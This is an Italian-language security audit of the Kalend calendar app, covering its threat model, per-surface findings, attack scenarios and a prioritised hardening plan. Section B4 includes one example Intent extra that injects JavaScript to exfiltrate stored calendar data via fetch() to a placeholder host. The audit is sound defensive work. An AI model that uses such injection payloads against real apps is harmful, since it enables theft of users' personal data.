# Kalend — analisi di sicurezza a 360° (v54, pagina web + parte nativa v53)

> **Nota (28/10/2026)**: il riferimento operativo è ora [`PIANO-INTERVENTI.md`](PIANO-INTERVENTI.md), che unisce questo report all'altro e corregge alcuni punti (sezione 7).

Scopo: capire come un attaccante potrebbe rubare o alterare gli eventi di un utente,
o compromettere il suo dispositivo attraverso Kalend, e che cosa va reso più solido.
**Nessuna modifica è stata applicata**: questo è il report preliminare richiesto.

Metodo: lettura completa del sorgente della pagina (`src/index.html`, 24.000 righe,
moduli v54), analisi delle stringhe e del manifest della parte nativa (il sorgente
Java non è nel repository: dove serve è indicato «da verificare nel nativo»),
prove pratiche già fatte in precedenza (iniezione HTML/JS in titoli, descrizioni,
luoghi, tag, partecipanti, colori: nessuna riuscita).

Legenda gravità: 🔴 alta (furto o alterazione dei dati realistico) · 🟠 media ·
🟡 bassa · ✅ già solido.

---

## A. Modello delle minacce (chi attacca e da dove)

| # | Attaccante | Via d'ingresso in Kalend |
|---|---|---|
| 1 | Chi manda un file (e‑mail, chat, sito) | Import di backup `.json` o file `.ics` |
| 2 | Chi controlla un calendario collegato | Link iCal (sottoscrizione) con contenuto o redirect ostili |
| 3 | Chi è sulla stessa rete Wi‑Fi | Sincronizzazione QR (WebRTC senza server) |
| 4 | Un'altra app installata sul telefono | Intent verso l'Activity (esportata come launcher) e i ricevitori del widget (esportati) |
| 5 | Chi ha il telefono in mano (furto, smarrimento, “prestito”) | Widget, notifiche sul blocco schermo, anteprima app recenti, backup esportati, debug USB |
| 6 | Chi sta in mezzo alla rete | Traffico verso meteo, geocodifica, festività, calendari |
| 7 | I servizi di terze parti | Ricevono luoghi degli eventi, coordinate, lingua, paese |
| 8 | Chi manomette l'APK o la filiera di build | APK ri‑firmato con malware, librerie inline, chiave di firma |

Non è stata trovata **nessuna backdoor**: nessun server dell'autore, nessuna
telemetria, nessun `eval`/`new Function`/`document.write`, nessun script o font
esterno, nessun SDK di terzi nel dex (solo classi `app.kalend.*` + AndroidX).
L'unico host incorporato nel nativo è `appassets.androidplatform.net` (pagina locale).

---

## B. Risultati per superficie d'attacco

### B1. Import di backup e file ICS (attaccante 1)

| Punto | Stato | Note |
|---|---|---|
| Gestore import indurito v43 (`hookImport`) | ✅ | Intercetta l'evento in capture con `stopImmediatePropagation`, limite 20 MB, `validBackup`, `sanitizeEventsObj`/`cleanEvent` (filtro `__proto__`, caratteri di controllo e bidi, lunghezze, colori, id), copia di sicurezza prima di scrivere, conferma esplicita per il ripristino totale, annulla. |
| ICS: limite 15 MB, 20.000 eventi, `cleanEvent` su ogni evento | ✅ | Anche per i file; ricorrenze saltate. |
| **Vecchio gestore import (riga ~13095) ancora nella pagina** | 🟠 | Scrive il backup grezzo in `localStorage` senza alcun filtro (eventi, impostazioni, catene). Oggi è «morto» perché il nuovo lo blocca, ma se `hookImport` non si installa (id dell'elemento cambiato, errore JS precedente) torna attivo. Va rimosso. |
| **`writeBackup` ripristina `settings` per intero** | 🟠 | Toglie solo le chiavi prototipo. Un backup confezionato ad arte può impostare: coordinate di casa (`homeGeo`), località predefinita, paese, lingua, chiave API Open‑Meteo (così il traffico dell'utente viene attribuito alla chiave dell'attaccante), festività finte, bandierine delle funzioni. Nessun danno diretto ai dati, ma è un vettore di manipolazione silenziosa. Serve una lista bianca delle chiavi con tipo e intervallo. |
| Backup JSON esportato **in chiaro** con `settings` complete | 🔴 | Il file contiene anche coordinate di casa, località predefinita e (v54) la chiave API commerciale. Viene consegnato al foglio di condivisione Android: qualunque app scelta lo riceve; finisce in chat/e‑mail/cloud senza cifratura. Chi lo trova legge tutto il calendario. |
| Prototype pollution via JSON | ✅ | `BAD_KEYS` + `deepFix` su eventi, catene, To Do, tag, famiglie. |
| XSS da campi evento | ✅ | 205 `innerHTML` tutti accompagnati da `esc()`/`escapeHtml`; prova pratica negativa su 12 viste. |

### B2. Calendari collegati (iCal) e rete (attaccanti 2, 6)

| Punto | Stato | Note |
|---|---|---|
| URL: solo `https://`/`webcal://`, no host locali/privati, no credenziali nell'URL | ✅ | `safeRemoteUrl` (lato pagina). |
| URL segreti (es. iCal privato Google) nel vault AES‑256‑GCM con chiave in AndroidKeyStore; nel backup esce solo la maschera | ✅ | Fallback web: chiave non estraibile in IndexedDB. |
| **Redirect seguiti manualmente dal nativo** (`Location`, `getHeaderField`) | 🟠 | Da verificare nel nativo: se dopo il redirect non ricontrolla schema e host, un feed «pubblico» può rimandare a un indirizzo della rete locale (router, NAS: SSRF) o a un altro host. Il contenuto torna all'app e passa da `cleanEvent`, quindi non c'è esecuzione, ma c'è avvelenamento del calendario e scansione della LAN. Serve: max 3 redirect, solo https, stesso controllo di `safeRemoteUrl`, tetto alla dimensione in download (oggi il limite di 15 MB è applicato solo dopo). |
| Traffico in chiaro | ✅ | `usesCleartextTraffic` non dichiarato → bloccato di default (targetSdk ≥ 28). Nessun TrustManager/HostnameVerifier personalizzato (niente pinning, ma niente indebolimenti). |
| Avvelenamento del calendario da feed ostile | 🟡 | Eventi aggiunti/rimossi a ogni aggiornamento (3 h): un feed compromesso può inserire appuntamenti falsi/«phishing» (es. «Chiama la banca al numero…»). Mitigazione: mostrare la provenienza e non auto‑taggare/notificare i feed non fidati. |
| Risposte meteo/geocodifica/festività | ✅ | JSON letti con `resp.json()`, testo inserito con `escapeHtml` o `textContent`; nomi festività salvati in `settings.holidays` e usati come testo. |
| CSP `connect-src 'self' https:` | 🟠 | Qualunque host https è raggiungibile dalla pagina. Non apre da solo una falla, ma se mai uno script venisse iniettato (vedi B4) l'esfiltrazione è immediata. Nell'app i feed iCal passano dal nativo, quindi la CSP può essere ristretta ai 5 host noti senza perdere funzioni. |
| `style-src 'unsafe-inline'` | 🟡 | Permette solo iniezioni di stile (schermate ingannevoli), non codice. Accettabile. |

### B3. Sincronizzazione QR fra telefono e tablet (attaccante 3)

| Punto | Stato | Note |
|---|---|---|
| Canale WebRTC cifrato (DTLS), nessun server esterno, solo candidati di rete locale (`iceServers:[]`) | ✅ | I dati non escono dalla LAN. |
| **Nessuna autenticazione del dispositivo remoto** | 🔴 | Il QR è un JSON base64 con l'SDP. Chi lo inquadra si collega a chi l'ha generato, chiunque sia. Scenario: un «QR per sincronizzare» stampato o mostrato su un sito dentro la stessa Wi‑Fi (ufficio, scuola, bar): l'utente lo inquadra col telefono, l'app in ruolo «cellulare» **invia l'intero calendario appena il canale si apre**, senza chiedere conferma. Viceversa il tablet accetta `full_state` da chiunque risponda e sovrascrive i propri archivi (sanificati, ma sovrascritti; resta la copia di sicurezza automatica). |
| Dati ricevuti filtrati da `syncGuard` | ✅ | Solo 7 chiavi note, ≤ 15 MB, JSON valido, `sanitizeEventsObj`/`deepFix`, snapshot prima del primo arrivo. |
| Ultimo QR salvato in `localStorage` (`LS_LAST`) | 🟡 | Contiene l'SDP (IP locale, impronta DTLS): informazione di rete inutile da conservare. |
| Ogni modifica al telefono ri‑invia tutto lo stato (hook su `Storage.prototype`) | 🟡 | Comportamento voluto, ma manda anche `cal_settings` (coordinate di casa) al tablet. |

Rendere solido: codice di verifica a 6 cifre derivato dall'impronta DTLS mostrato
su entrambi gli schermi, conferma «Inviare il mio calendario a *questo* dispositivo?»
prima del primo `full_state`, memoria dei dispositivi già abbinati, scadenza del QR
(2 minuti), nessun salvataggio del QR.

### B4. Ponte nativo ↔ pagina e Intent (attaccante 4)

| Punto | Stato | Note |
|---|---|---|
| Pagina servita da `WebViewAssetLoader` (`https://appassets.androidplatform.net`), non da `file://` | ✅ | Niente accesso ai file locali via origine `file`. `setAllowFileAccess`/`setAllowContentAccess` presenti: valori da verificare (devono essere `false`). |
| `shouldOverrideUrlLoading` / `shouldInterceptRequest` presenti | ✅/da verificare | Devono rifiutare ogni navigazione fuori da `appassets` e `kalend://`. |
| ~~Il bridge `KalendNative` espone anche `loadUrl` e `finish`~~ **Rettifica**: l'elenco dei metodi della classe `MainActivity$Bridge`, letto dal dex, NON contiene `loadUrl` né `finish`: le stringhe trovate erano le chiamate interne a `WebView.loadUrl` e `Activity.finish`. Il bridge espone solo i metodi usati dalla pagina più `exactAlarms`, `vaultHas`, `version`. | ✅ | Punto chiuso. Resta il principio: nessun metodo del bridge deve permettere di caricare pagine esterne. |
| **JavaScript costruito dal nativo per concatenazione** (`KX.openDate('…')`, `KX.openEventById(…)`, `KX.voice.mode('…')`, `KX.alert(…)`, `__knCb(…)`) | 🔴 (da verificare nel nativo) | Il dex contiene `JSONObject.quote`, quindi probabilmente i valori sono codificati; ma i valori arrivano da extra di Intent (`date`, `list`, `mode`, `text`) e dalle risposte HTTP (`__knCb`). `MainActivity` è esportata (è il launcher) e i ricevitori del widget sono esportati: **un'altra app** può inviare un Intent con `date` = `');fetch('https://x/?'+localStorage.getItem('cal_events_v1'));//` e, se la stringa non è codificata, ottiene tutto il calendario. Stessa cosa per il corpo di una risposta HTTP se `__knCb` non lo codifica. Regola: ogni valore passato a `evaluateJavascript` va serializzato con `JSONObject.quote`, validato (data `^\d{4}-\d{2}-\d{2}$`, modalità da enum) e gli extra accettati solo da PendingIntent propri (nonce segreto o azioni protette da `android:permission` a livello firma). |
| `openUrl` | ✅/da verificare | La pagina passa solo l'URL del modello Google Calendar (campi codificati). Il nativo dichiara un filtro (v31): deve ammettere solo `https://` (mai `intent://`, `javascript:`, `file:`). |
| `saveFile`/`shareText` | ✅ | Nome file costruito dalla pagina (`calendario_backup_AAAA-MM-GG.json`), nessun input esterno nel nome. |
| `setWebContentsDebuggingEnabled` presente nel dex | 🟠 | Se in release fosse `true`, chi collega il telefono via USB con debug attivo legge tutto da `chrome://inspect`. Deve essere `BuildConfig.DEBUG`. |
| Ricevitori del widget esportati (obbligatorio per i widget) con azioni proprie (`W_PICK`, `W_MODE`, `W_LISTS`, `W_MUSIC`…) | 🟠 | Qualsiasi app può inviarle: nel peggiore dei casi cambia filtro/modalità del widget, fa partire la musica, apre liste. Da proteggere con controllo del pacchetto chiamante o `android:permission`. |

### B5. Dati a riposo, telefono in mano, backup di sistema (attaccante 5)

| Punto | Stato | Note |
|---|---|---|
| Eventi, catene, To Do, impostazioni in `localStorage`; 12 copie automatiche in IndexedDB | 🟠 | **In chiaro** nella sandbox dell'app. Protetti dal sistema finché il telefono non è rootato o estratto forensicamente. Solo gli URL iCal sono cifrati. |
| `allowBackup=true`, regole che escludono solo `kalend_vault.xml` | 🟠 | Il backup automatico Android (Google Drive) e il trasferimento fra dispositivi includono la cartella `app_webview` → l'intero calendario in chiaro finisce nel backup cloud (cifrato da Google con il blocco schermo, ma fuori dal controllo dell'app). Scelta da dichiarare nella Data safety o da escludere. |
| Nessun `FLAG_SECURE` | 🟡 | Screenshot, registrazione schermo e anteprima nelle app recenti mostrano il calendario. Opzione «privacy» consigliata. |
| Notifiche promemoria con titolo evento | 🟡 | Visibili sul blocco schermo secondo le impostazioni di sistema. Consigliato `VISIBILITY_PRIVATE` con testo generico sul blocco. |
| Widget sulla schermata iniziale | 🟡 | Chi ha il telefono sbloccato vede gli impegni: inerente al prodotto. |
| Appunti (`navigator.clipboard.writeText`) | 🟡 | Su Android ≤ 9 qualunque app legge gli appunti. |
| Nessun blocco con PIN/biometria dell'app | 🟡 | Funzione attesa per un'app a pagamento con dati personali. |

### B6. Terze parti e privacy (attaccante 7)

| Flusso | Che cosa esce | Valutazione |
|---|---|---|
| Open‑Meteo (meteo) | Coordinate arrotondate a 2 decimali (~1 km), lingua | ✅ buona minimizzazione |
| Open‑Meteo geocoding / Nominatim | **Testo del luogo dell'evento** (es. «Studio dott. Rossi, via…»), lingua | 🟠 rivela luoghi sensibili (medici, legali). Nessun identificativo utente, ma IP sì. Da dichiarare; valutare cache locale e consenso. |
| Nager.Date | Codice paese, anno | ✅ |
| Riconoscimento vocale Android | Audio → server Google (SpeechRecognizer) | 🟠 da dichiarare (Data safety: audio) |
| Google Calendar «apri in» | Titolo/descrizione/luogo nell'URL | ✅ azione esplicita dell'utente |
| Calendario Android (`READ_CALENDAR`) | Lettura locale | ✅ |
| Posizione (`ACCESS_FINE_LOCATION`) | Solo su azione dell'utente, arrotondata verso i servizi | ✅ (verificare che non venga mai chiesta all'avvio) |

### B7. APK, firma, filiera di build (attaccante 8)

| Punto | Stato | Note |
|---|---|---|
| CSP con hash SHA‑256 per ogni script, nessuna risorsa esterna, `frame-src 'none'`, `object-src 'none'`, `base-uri 'none'`, `form-action 'none'` | ✅ | Ottima base: nessun caricamento da rete di codice. |
| Librerie inline (QR, sintesi musicale) senza versione tracciata | 🟡 | Tenere un elenco con versione e hash per gli aggiornamenti di sicurezza. |
| APK originale firmato v1+v2, **senza v3** | 🟡 | Senza v3 non si potrà mai ruotare la chiave. Con Play App Signing il problema sparisce. |
| Chiave di prova (`android/test-key.pem`) fuori da git | ✅ | Mai distribuire l'APK di prova. |
| Ri‑impacchettamento (qualcuno ridistribuisce un APK modificato) | 🟡 | Inevitabile fuori dal Play Store; Play Integrity opzionale. |
| `debuggable` non dichiarato | ✅ | Falso di default. |

---

## C. Scenari d'attacco concreti (dal più facile)

1. **«Ti mando il mio calendario»**: file JSON ostile → oggi i dati vengono sanificati e si chiede conferma; residuo: impostazioni manipolate (B1). Basso impatto, facile da chiudere.
2. **QR finto nella stessa Wi‑Fi** → furto dell'intero calendario in un gesto, nessun avviso (B3). **Il più realistico oggi.**
3. **App malevola sul telefono** che invia un Intent con extra costruito → se il nativo concatena senza codificare, esecuzione di JS con bridge → furto totale, lettura calendario Android, URL iCal segreti (B4). Da verificare subito nel sorgente Java; `loadUrl` nel bridge aggrava.
4. **Backup esportato intercettato** (chat, e‑mail, cloud) → tutto in chiaro, incluse coordinate di casa (B1/B5).
5. **Feed iCal compromesso** → eventi falsi e scansione LAN via redirect (B2).
6. **Telefono rubato sbloccato / forense** → dati in chiaro, backup cloud, nessun PIN app (B5).

---

## D. Piano di irrobustimento (in ordine di priorità)

| Pri. | Intervento | Dove | Chiude |
|---|---|---|---|
| 1 | ~~Togliere `loadUrl` e `finish` dal bridge~~ (rettifica: non esposti); verificare che `shouldOverrideUrlLoading` blocchi tutto tranne `appassets` e `kalend://` | nativo | B4 |
| 2 | Ogni stringa verso `evaluateJavascript` passata da `JSONObject.quote`; validare `date`/`mode`/`list`; accettare extra solo dai propri PendingIntent (nonce); azioni widget protette | nativo | B4 |
| 3 | Pairing con codice di verifica a 6 cifre su entrambi i dispositivi + conferma prima del primo invio + QR a scadenza + niente `LS_LAST` | pagina | B3 |
| 4 | Backup esportato **cifrato con password** (AES‑256‑GCM, chiave da PBKDF2 600k o Argon2); senza password: esportare senza `homeGeo`, `defaultLocation`, `openMeteoKey`, con avviso | pagina | B1/B5 |
| 5 | `writeBackup`: lista bianca delle impostazioni con tipo e intervallo; rimozione del vecchio gestore import | pagina | B1 |
| 6 | Redirect nel nativo: max 3, solo https, stesso filtro host di `safeRemoteUrl`, tetto 15 MB in download, timeout | nativo | B2 |
| 7 | CSP: `connect-src` ristretta agli host noti (`api.open-meteo.com`, `geocoding-api.open-meteo.com`, `customer-*.open-meteo.com`, `nominatim.openstreetmap.org`, `date.nager.at`) | pagina + build | B2/B4 |
| 8 | `setWebContentsDebuggingEnabled(BuildConfig.DEBUG)`, `setAllowFileAccess(false)`, `setAllowContentAccess(false)`, `setSafeBrowsingEnabled(true)` | nativo | B4 |
| 9 | Cifratura degli archivi (eventi, catene, To Do, snapshot) con chiave in AndroidKeyStore riutilizzando `Vault`; escludere `app_webview` dal backup automatico o dichiararlo | nativo + pagina | B5 |
| 10 | Blocco app con biometria/PIN (BiometricPrompt) opzionale; `FLAG_SECURE` opzionale; notifiche con testo privato sul blocco schermo | nativo | B5 |
| 11 | Provenienza visibile per gli eventi da feed; nessuna notifica/auto‑tag per i feed non confermati | pagina | B2 |
| 12 | Firma v2+v3 e Play App Signing; elenco librerie inline con versione e hash | build | B7 |
| 13 | Informativa privacy e Data safety coerenti con B6 (luoghi a Open‑Meteo/Nominatim, audio a Google, backup cloud) | documenti | B6 |

Gli interventi 3, 4, 5, 7, 11 si fanno nella pagina (sorgente nel repository).
Gli interventi 1, 2, 6, 8, 9, 10 richiedono il sorgente Java della parte nativa,
che non è nel repository: senza, si possono solo verificare con una decompilazione.

---

## E. Che cosa è già fatto bene (da non toccare)

* Sanificazione profonda di ogni dato in ingresso (file, feed, sincronizzazione) con
  limiti di dimensione e numero, filtro prototipo, caratteri di controllo e bidi.
* Copia di sicurezza automatica prima di ogni operazione rischiosa e «Annulla».
* CSP severa con hash, nessuna risorsa remota, nessun `eval`.
* URL dei calendari in vault cifrato con chiave hardware; filtro host locali.
* Coordinate arrotondate verso il meteo; nessuna telemetria; nessuna backdoor.
* Nessun traffico in chiaro; pagina non servita da `file://`.
